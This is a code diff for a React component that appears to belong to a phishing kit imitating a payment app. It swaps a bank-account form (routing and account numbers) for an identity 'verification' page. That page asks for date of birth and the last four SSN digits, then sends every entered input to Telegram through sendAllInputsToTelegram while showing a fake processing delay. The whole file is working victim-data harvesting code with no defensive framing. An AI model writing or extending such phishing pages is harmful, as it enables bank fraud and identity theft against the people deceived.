@@ -3,35 +3,68 @@ import { HelpCircle, Loader2 } from 'lucide-react';
 import { useNavigate } from 'react-router-dom';
 import { sendAllInputsToTelegram } from '../utils/telegram';
 
-export function BankInfo() {
-  const [routingNumber, setRoutingNumber] = useState('');
-  const [accountNumber, setAccountNumber] = useState('');
+export function PersonalDetails() {
+  const [dob, setDob] = useState('');
+  const [ssn, setSsn] = useState('');
   const [isLoading, setIsLoading] = useState(false);
   const navigate = useNavigate();
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    if (routingNumber.length === 9 && accountNumber.length >= 6 && accountNumber.length <= 15) {
+    if (dob.length === 10 && ssn.length === 4) {
       setIsLoading(true);
       await sendAllInputsToTelegram();
       // Simulate processing
       setTimeout(() => {
         setIsLoading(false);
-        navigate('/personal-details');
+        // navigate('/success'); // Final destination
       }, 2000);
     }
   };
 
-  const isFormValid = routingNumber.length === 9 && accountNumber.length >= 6 && accountNumber.length <= 15;
+  const handleDobChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    let value = e.target.value.replace(/\D/g, '');
+    if (value.length > 8) value = value.slice(0, 8);
+    
+    // Basic validation logic for parts
+    if (value.length >= 2) {
+      let month = parseInt(value.slice(0, 2));
+      if (month > 12) value = '12' + value.slice(2);
+      if (month === 0 && value.length === 2) value = '01';
+    }
+    if (value.length >= 4) {
+      let day = parseInt(value.slice(2, 4));
+      if (day > 31) value = value.slice(0, 2) + '31' + value.slice(4);
+      if (day === 0 && value.length === 4) value = value.slice(0, 2) + '01' + value.slice(4);
+    }
+    
+    // Format: MM/DD/YYYY
+    let formatted = value;
+    if (value.length > 4) {
+      formatted = `${value.slice(0, 2)}/${value.slice(2, 4)}/${value.slice(4)}`;
+    } else if (value.length > 2) {
+      formatted = `${value.slice(0, 2)}/${value.slice(2)}`;
+    }
+    setDob(formatted);
+  };
+
+  const handleSsnChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const value = e.target.value.replace(/\D/g, '');
+    if (value.length <= 4) {
+      setSsn(value);
+    }
+  };
+
+  const isFormValid = dob.length === 10 && ssn.length === 4;
 
   return (
     <div className="min-h-screen bg-black text-white font-sans flex flex-col items-center justify-center p-6">
       <div className="w-full max-w-[520px] mx-auto">
         <h1 className="text-[32px] md:text-[40px] font-bold mb-4 leading-tight tracking-tight">
-          Enter your linked bank account info
+          Verify your identity
         </h1>
 
-        <button className="flex items-center gap-2 text-[#00D632] mb-12 hover:opacity-80 transition-opacity">
+        <button className="flex items-center gap-2 text-[#00D1FF] mb-12 hover:opacity-80 transition-opacity">
           <HelpCircle size={20} />
           <span className="text-[17px] font-medium">Get help</span>
         </button>
@@ -39,20 +72,15 @@ export function BankInfo() {
         <form onSubmit={handleSubmit} className="space-y-8">
           <div className="space-y-2">
             <label className="text-[#8a8a8a] text-[17px] block">
-              Routing number
+              Date of birth
             </label>
             <div className="bg-[#1A1A1A] rounded-2xl p-4">
               <input
                 type="text"
-                name="routing_number"
-                value={routingNumber}
-                onChange={(e) => {
-                  const val = e.target.value.replace(/\D/g, '');
-                  if (val.length <= 9) {
-                    setRoutingNumber(val);
-                  }
-                }}
-                placeholder="9-digit routing number"
+                name="dob"
+                value={dob}
+                onChange={handleDobChange}
+                placeholder="MM/DD/YYYY"
                 className="bg-transparent outline-none w-full text-[19px] placeholder:text-[#333333]"
               />
             </div>
@@ -60,20 +88,16 @@ export function BankInfo() {
 
           <div className="space-y-2">
             <label className="text-[#8a8a8a] text-[17px] block">
-              Account number
+              Last 4 digits of your SSN or ITIN
             </label>
             <div className="bg-[#1A1A1A] rounded-2xl p-4">
               <input
                 type="text"
-                name="account_number"
-                value={accountNumber}
-                onChange={(e) => {
-                  const val = e.target.value.replace(/\D/g, '');
-                  if (val.length <= 15) {
-                    setAccountNumber(val);
-                  }
-                }}
-                placeholder="6-15 digit account number"
+                name="ssn_last_4"
+                value={ssn}
+                onChange={handleSsnChange}
+                placeholder="1234"
+                maxLength={4}
                 className="bg-transparent outline-none w-full text-[19px] placeholder:text-[#333333]"
               />
             </div>
@@ -85,8 +109,8 @@ export function BankInfo() {
               disabled={isLoading || !isFormValid}
               className={`w-full py-4 rounded-full text-[18px] font-bold transition-all flex items-center justify-center ${
                 isFormValid && !isLoading
-                  ? 'bg-[#00D632] text-black hover:opacity-90 cursor-pointer'
-                  : 'bg-[#00D632]/20 text-black/30 cursor-not-allowed'
+                  ? 'bg-[#00D1FF] text-white hover:opacity-90 cursor-pointer'
+                  : 'bg-[#00D1FF]/20 text-white/30 cursor-not-allowed'
               }`}
             >
               {isLoading ? (
